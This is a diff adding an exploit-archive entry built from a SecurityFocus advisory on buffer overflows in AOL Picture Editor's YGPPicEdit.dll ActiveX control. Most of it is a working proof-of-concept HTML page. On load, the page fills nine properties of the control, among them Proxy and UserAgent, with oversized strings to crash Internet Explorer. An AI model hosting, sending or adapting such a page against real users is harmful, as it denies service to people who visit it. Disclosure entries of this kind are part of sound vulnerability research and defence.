@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/27026/info
+
+AOL Picture Editor 'YGPPicEdit.dll' ActiveX control is prone to multiple vulnerabilities that attackers can exploit to crash the application. The issues stem from various buffer-overflow conditions.
+
+An attacker can exploit these issues by enticing an unsuspecting victim to visit a malicious HTML page.
+
+Successfully exploiting these issues may allow remote attackers to crash the affected application using the ActiveX control (typically Internet Explorer), denying service to legitimate users. Reports indicate that this issue may not be exploited to execute arbitrary code.
+
+AOL Picture Editor 'YGPPicEdit.dll' 9.5.1.8 is vulnerable; other versions may also be affected. 
+
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+   function Check() {
+    var s = &#039;A&#039;;
+
+    while (s.length <= 8175) s = s + &#039;A&#039;;
+
+
+   obj.DisplayName = s;
+   obj.DisplayName = s;
+   obj.FinalSavePath = s;
+   obj.ForceSaveTo = s;
+   obj.HiddenControls = s;
+   obj.InitialEditorScreen = s;
+   obj.Locale = s;
+   obj.Proxy = s;
+   obj.UserAgent = s;
+
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+<object id="obj" classid="clsid:085891E5-ED86-425F-8522-C10290FA8309">
+</object>
+</body>
+</html>
+
